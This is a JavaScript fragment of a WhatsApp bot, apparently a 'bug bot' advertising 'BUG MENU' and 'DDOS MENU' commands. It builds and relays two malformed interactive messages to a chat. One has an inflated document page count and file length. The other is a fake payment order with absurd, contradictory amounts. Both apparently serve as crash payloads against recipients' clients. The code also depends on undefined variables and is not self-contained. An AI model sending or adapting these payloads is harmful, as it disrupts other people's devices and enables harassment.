const fs = require('fs');
const path = require('path');
const Jimp = require('jimp'); // Ensure Jimp is installed and required

// Function to resize an image using Jimp
let resize = async (image, width, height) => {
    let oyy = await Jimp.read(image);
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG);
    return kiyomasa;
}

// Example function to handle some message sending functionality
let penis = async () => {
    let freesex = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    "header": {
                        "title": "*THOMAS SHELBY MD💀*",
                        ...(await prepareWAMessageMedia({
                            document: overlaid,
                            pageCount: 9999999,
                            fileLength: 99999999999999,
                            mimetype: 'image/png',
                            jpegThumbnail: await resize(fs.readFileSync(`./media/overlaid.jpg`), 400, 400)
                        }, {
                            upload: ryozingod.waUploadToServer
                        })),
                        "hasMediaAttachment": true
                    },
                    "body": {
                        "text": ""
                    },
                    "footer": {
                        "text": "*# Zero Execution Vault - 2k24*"
                    },
                    "nativeFlowMessage": {
                        "buttons": [
                            {
                                "name": "single_select",
                                "buttonParamsJson": JSON.stringify({
                                    "title": "🦠 SEE ALL MENU 🎩",
                                    "sections": [
                                        {
                                            "title": "👾 Choose One Of Them ⭐",
                                            "highlight_label": "#General",
                                            "rows": [
                                                {
                                                    "header": "[ ❇️ ] • ALL CMD",
                                                    "title": "❗Show All Command",
                                                    "id": ".allmenu"
                                                },
                                                {
                                                    "header": "👤 - CONTACT THE OWNER",
                                                    "title": "❗Displays Owner Number",
                                                    "id": ".owner"
                                                },
                                                {
                                                    "header": "🖥️ - Bot Info",
                                                    "title": "❗Displays Information About Bots",
                                                    "id": ".botstatus"
                                                }
                                            ]
                                        },
                                        {
                                            "title": "🍷 SUPERIOR COMMAND ♦️",
                                            "highlight_label": "#FRONT",
                                            "rows": [
                                                {
                                                    "header": "🎩 - BUG MENU ‼️",
                                                    "title": "❗Displays All Bug Commands",
                                                    "id": ".bugmenu"
                                                },
                                                {
                                                    "header": "🔗 - DDOS MENU 📥",
                                                    "title": "❗Displays All Ddos",
                                                    "id": ".ddosmenu"
                                                }
                                            ]
                                        }
                                    ]
                                })
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": JSON.stringify({
                                    "display_text": "Saluran WhatsApp",
                                    "url": "https://whatsapp.com/channel/0029VadBczKI1rcayqzQ2n0e",
                                    "merchant_url": "https://whatsapp.com/channel/0029VadBczKI1rcayqzQ2n0e"
                                })
                            }
                        ],
                        "messageParamsJson": ""
                    },
                    "contextInfo": {
                        "mentionedJid": [m.sender],
                        "externalAdReply": {
                            "title": "d4-stardust",
                            "thumbnail": null,
                            "previewType": "PHOTO",
                            "mediaType": 2
                        }
                    }
                }
            }
        }
    };

    ryozingod.relayMessage(m.chat, freesex, {});
}

penis();

// Define the prefix and command handling
const prefixRegex = /^[°•π÷×¶∆£¢€¥®y-™+✓_=|~!?@#$%^&.©^]/;
const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix);
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : '';

// Function to load plugins from a directory
const loadPlugins = (directory) => {
    let plugins = [];
    const folders = fs.readdirSync(directory);
    folders.forEach(folder => {
        const folderPath = path.join(directory, folder);
        if (fs.lstatSync(folderPath).isDirectory()) {
            const files = fs.readdirSync(folderPath);
            files.forEach(file => {
                const filePath = path.join(folderPath, file);
                if (filePath.endsWith('.js')) {
                    delete require.cache[require.resolve(filePath)];
                    const plugin = require(filePath);
                    plugins.push({ filePath, plugin });
                }
            });
        }
    });
    return plugins;
}

// Load plugins from the zetsubo directory
const plugins = loadPlugins(path.resolve(__dirname, './zetsubo'));

const context = {
    ryozingod,
    m,
    chatUpdate,
    store,
    smsg,
    getGroupAdmins,
    formatp,
    h2k,
    tanggal,
    formatDate,
    getTime,
    isUrl,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    runtime,
    fetchJson,
    getBuffer,
    jsonformat,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    pickRandom,
    reSize,
    ngeloc,
    buglive,
    isPremium,
    fpoll // Ensure fpoll is added to the context
};

// Handle commands using plugins
let handled = false;
for (const plugin of plugins) {
    if (plugin.plugin.command === command) {
        await plugin.plugin.operate(context);
        handled = true;
        break;
    }
}

// If not handled by plugins, use switch-case for default commands
if (!handled) {
    switch (command) {
        case 'a1':
            console.log('anjay1');
            break;
        case 'a2':
            console.log('anjay1');
            break;
        case 'a3':
            console.log('anjay1');
            break;
        case 'w1':
            console.log('woi1');
            break;
        case 'w2':
            console.log('woi2');
            break;
        case 'menu':
            let menu = `
👇berikut adalah menunya :

🩸a1
🩸a2
🩸a3
🩸w1
🩸w2
${plugins.map(p => `🩸${p.plugin.command}`).join('\n')}
`;
            console.log(menu);
            break;
        default:
            console.log('Command not found');
            break;
    }
}

// Define fpoll for polls
const fpoll = {
    key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "" } : {})
    },
    message: {
        "pollCreationMessage": {
            "name": "p"
        }
    }
};

// Define etc with payment details
let etc = {
    viewOnceMessage: {
        message: {
            "interactiveMessage": {
                "header": {
                    "hasMediaAttachment": true,
                    "jpegThumbnail": fs.readFileSync(`./media/overpix.png`)
                },
                "nativeFlowMessage": {
                    "buttons": [
                        {
                            "name": "review_and_pay",
                            "buttonParamsJson": JSON.stringify({
                                "currency": "IDR",
                                "total_amount": { "value": 49981399788, "offset": 100 },
                                "reference_id": "4OON4PX3FFJ",
                                "type": "physical-goods",
                                "order": {
                                    "status": "payment_requested",
                                    "subtotal": { "value": 49069994400, "offset": 100 },
                                    "tax": { "value": 490699944, "offset": 100 },
                                    "discount": { "value": 485792999999, "offset": 100 },
                                    "shipping": { "value": 48999999900, "offset": 100 },
                                    "order_type": "ORDER",
                                    "items": [
                                        {
                                            "retailer_id": "7842674605763435",
                                            "product_id": "7842674605763435",
                                            "name": "🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑",
                                            "amount": { "value": 9999900, "offset": 100 },
                                            "quantity": 7
                                        },
                                        {
                                            "retailer_id": "custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8",
                                            "name": "",
                                            "amount": { "value": 999999900, "offset": 100 },
                                            "quantity": 49
                                        }
                                    ]
                                },
                                "native_payment_methods": []
                            })
                        }
                    ]
                }
            }
        }
    }
};

ryozingod.relayMessage(m.chat, etc, {});
